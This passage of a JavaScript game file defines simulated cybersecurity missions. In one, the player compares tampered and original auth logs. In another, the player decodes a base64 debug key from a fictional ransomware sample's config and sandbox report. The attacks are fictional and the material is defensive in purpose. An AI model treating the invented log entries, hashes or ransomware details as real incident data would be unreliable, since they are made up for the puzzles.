        'auth_log_original.txt': 'AUTH LOG (BACKUP — UNMODIFIED)\n01 | 2024-04-12 01:00:00 | admin | LOGIN | SUCCESS | 10.0.0.1\n02 | 2024-04-12 01:15:00 | admin | VIEW_ACCOUNTS | SUCCESS | 10.0.0.1\n03 | 2024-04-12 02:00:00 | unknown_user | LOGIN | SUCCESS | 192.168.99.1\n04 | 2024-04-12 02:05:00 | unknown_user | ESCALATE_PRIV | SUCCESS | 192.168.99.1\n05 | 2024-04-12 02:10:00 | unknown_user | CREATE_ACCOUNT | backdoor_admin | 192.168.99.1\n06 | 2024-04-12 02:15:00 | unknown_user | TRANSFER | $5,000,000 -> ACCT:CH9300762011623852957 | 192.168.99.1\n07 | 2024-04-12 02:20:00 | unknown_user | DELETE_LOGS | ATTEMPTED | 192.168.99.1\n08 | 2024-04-12 02:25:00 | unknown_user | LOGOUT | SUCCESS | 192.168.99.1\n09 | 2024-04-12 08:00:00 | admin | LOGIN | SUCCESS | 10.0.0.1\n10 | 2024-04-12 08:30:00 | admin | DAILY_REPORT | SUCCESS | 10.0.0.1'
      },
      'tampered_logs': {
        'auth_log_current.txt': 'AUTH LOG (CURRENT — POTENTIALLY TAMPERED)\n01 | 2024-04-12 01:00:00 | admin | LOGIN | SUCCESS | 10.0.0.1\n02 | 2024-04-12 01:15:00 | admin | VIEW_ACCOUNTS | SUCCESS | 10.0.0.1\n03 | 2024-04-12 08:00:00 | admin | LOGIN | SUCCESS | 10.0.0.1\n04 | 2024-04-12 08:30:00 | admin | DAILY_REPORT | SUCCESS | 10.0.0.1\n\n[NOTE: Entries 03-08 from original are MISSING]'
      },
      'analysis_notes.txt': 'FORENSIC NOTES:\n- Original backup was auto-synced before attacker could reach it\n- Compare line counts: Original has 10 entries, Current has 4\n- 6 entries were deleted from the tampered version\n- Critical deleted entries: lines 03-08 (the entire attack session)\n- Key finding: $5M transfer to Swiss account CH9300762011623852957\n- Key finding: Backdoor account "backdoor_admin" was created'
    }
  },
  initialPath: '/log_analysis',
  hints: [
    "Compare the two log files — one in original_backup, one in tampered_logs.",
    "Count the entries in each. The tampered log is missing several critical lines.",
    "Read the analysis_notes.txt for a summary of what was removed."
  ],
  progressKeys: ['readOriginal', 'foundTampering'],
  successCondition: (p) => p.readOriginal && p.foundTampering,
  triggers: [
    { command: 'cat', args: ['auth_log_original.txt'], progressUpdate: { readOriginal: true }, narrative: '📋 Original log shows 10 entries including unauthorized access, privilege escalation, and a $5M transfer!' },
    { command: 'cat', args: ['analysis_notes.txt'], progressUpdate: { foundTampering: true }, narrative: '🔓 Confirmed: Attacker deleted 6 log entries covering their tracks. The $5M went to Swiss account CH93...957.' }
  ]
};

export const mission15 = {
  id: 'mission15', name: 'The Ransomware Key', level: 15, estimatedTime: 9,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'decode', 'crack', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, a city's infrastructure was hit by ransomware. Traffic lights, water systems, and emergency services are down. We can't pay the ransom.\n\nLuckily, the ransomware authors made a mistake — they included a debug key in a test build. Find it in the ransomware sample we captured.\n\n— Handler Bravo`,
  objective: 'Find the debug decryption key hidden in the ransomware sample',
  story: { intro: "A city's infrastructure is down. Find the debug key to unlock everything.", completion: "Debug key found: DARKNET_KEY_2024_SKELETON. The ransomware authors left it in a base64-encoded config. City infrastructure restored!" },
  filesystem: {
    'ransomware_analysis': {
      'sample': {
        'manifest.txt': 'RANSOMWARE SAMPLE: DarkLock v2.3\nType: File Encrypting Ransomware\nTarget: Windows Server 2019+\nEncryption: AES-256-CBC\nKey Exchange: RSA-2048\nC2: darklock[.]onion\nRansom: 100 BTC ($6.5M)',
        'strings_dump.txt': 'Strings extracted from darklock.exe:\n...\nCreateFileW\nWriteFile\nCryptEncrypt\nCryptGenKey\nYour files have been encrypted\nSend 100 BTC to\ndarklock[.]onion\ntimer_start\ntimer_expire=72h\n...\nDEBUG_MODE=false\ndebug_config.dat\n...\nVersion 2.3-beta\ntest_build=true\n...',
        'debug_config.dat': 'REFBSS0tLS1CRUdJTiBERUJVRyBDT05GSUctLS0tLQpNb2RlOiB0ZXN0X2J1aWxkCkRlYnVnIEtleTogREFSS05FVF9LRVlfMjAyNF9TS0VMRVRPTgpOb3RlOiBSZW1vdmUgYmVmb3JlIHByb2R1Y3Rpb24gcmVsZWFzZQotLS0tLUVORCBERUJVRyBDT05GSUctLS0tLQ=='
      },
      'analysis': {
        'behavior_report.txt': 'SANDBOX BEHAVIOR REPORT:\n1. darklock.exe executed\n2. Checks for DEBUG_MODE flag\n3. If debug: loads debug_config.dat\n4. If production: generates random AES key\n5. Encrypts all files in %USERPROFILE%\n6. Drops ransom note on desktop\n7. Contacts C2 for key escrow\n8. Note: Debug builds use hardcoded key from config\n\nCRITICAL FINDING:\nThis is a TEST BUILD (test_build=true in strings)\nDebug key is in debug_config.dat (base64 encoded)',
        'hash.txt': 'MD5: 5d41402abc4b2a76b9719d911017c592\nSHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nSSDeep: 3072:abc123...\nImphash: def456...'
      }
    }
  },
  initialPath: '/ransomware_analysis',
  hints: [
    "Start with the strings dump — look for anything mentioning 'debug' or 'config'.",
    "The behavior report explains that debug builds use a hardcoded key from debug_config.dat.",
    "The debug_config.dat file is base64 encoded. Use 'decode debug_config.dat base64' to reveal the key."
  ],
  progressKeys: ['foundDebugReference', 'decodedKey'],
  successCondition: (p) => p.foundDebugReference && p.decodedKey,
  decodeDatabase: { 'debug_config.dat': { base64: '-----BEGIN DEBUG CONFIG-----\nMode: test_build\nDebug Key: DARKNET_KEY_2024_SKELETON\nNote: Remove before production release\n-----END DEBUG CONFIG-----' } },
  triggers: [
    { command: 'cat', args: ['behavior_report.txt'], progressUpdate: { foundDebugReference: true }, narrative: '🔬 This is a test build! The debug key is in debug_config.dat — it\'s base64 encoded.' },
    { command: 'decode', args: ['debug_config.dat', 'base64'], progressUpdate: { decodedKey: true }, narrative: '🔑 KEY FOUND: DARKNET_KEY_2024_SKELETON! City infrastructure can be restored!' }
  ]
};

export const chapter1Missions = [mission6, mission7, mission8, mission9, mission10, mission11, mission12, mission13, mission14, mission15];
